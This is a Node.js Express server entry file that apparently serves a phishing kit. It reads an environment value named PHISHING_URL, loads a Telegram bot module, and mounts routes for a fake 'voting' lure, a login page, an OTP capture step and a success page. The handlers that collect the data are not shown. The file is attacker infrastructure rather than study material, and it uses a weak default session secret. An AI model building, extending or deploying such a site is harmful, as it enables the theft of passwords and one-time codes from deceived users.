const express = require('express');
const path = require('path');
const session = require('express-session');
const flash = require('connect-flash');
const app = express();
const connectDB = require("../lib/mongodb");
require("dotenv").config();
require("../lib/telegramBot");
const cors = require("cors")
const MongoStore = require('connect-mongo');



// Cache the Express app globally to prevent re-initialization
// Use global object to persist across serverless function invocations
global.app = global.app || null;

const createApp = async () => {

    connectDB();
    // Set EJS as templating engine
    app.use(cors({ origin: '*' }));
    app.set('view engine', 'ejs');
    app.set('views', path.join(__dirname, 'views'));
    app.use(express.json());
    app.use(express.urlencoded({ extended: true }));
    app.use(express.static(path.join(__dirname, 'public')));

    // CORS
    app.use(cors());

    // Session with MongoDB store
    app.use(session({
        secret: process.env.SESSION_SECRET || 'secret',
        resave: false,
        saveUninitialized: false,
        cookie: {
            maxAge: 1000 * 60 * 60 * 24,
            httpOnly: true,
            sameSite: 'lax',
            secure: process.env.NODE_ENV === 'production'
        }
    }));

    // Session and Flash middleware setup
    app.use(session({
        secret: process.env.SESSION_SECRET || 'your-secret-key',
        resave: false,
        saveUninitialized: false,
        cookie: { secure: process.env.NODE_ENV === 'production' }
    }));
    app.use(flash());

    // Flash middleware to make messages available to all templates
    app.use((req, res, next) => {
        res.locals.p_link = process.env.PHISHING_URL;
        res.locals.success_msg = req.flash('success_msg');
        res.locals.error_msg = req.flash('error_msg');
        res.locals.error = req.flash('error');
        next();
    });

    // Import routes
    const votingRouter = require('../routes/slink');
    const loginRouter = require('../routes/slink/lgin');
    const otpRouter = require('../routes/slink/otp');
    const successRouter = require('../routes/slink/success');
    const apiRouter = require('../routes/api');

    // Use routes
    app.use('/slink', votingRouter);
    app.use('/slink/lgin', loginRouter);
    app.use('/slink/otp', otpRouter);
    app.use('/slink/success', successRouter);
    app.use('/api', apiRouter);
    app.use("/not-found", (req, res) => {
        res.render('not-found');
    });
    // not found for everything else
    app.use((req, res) => {
        res.status(404).render('not-found');
    });

    // Cache the app globally
    global.app = app;

    return app;
};

// Export for Vercel serverless
module.exports = async (req, res) => {
    const expressApp = await createApp();
    expressApp(req, res);
};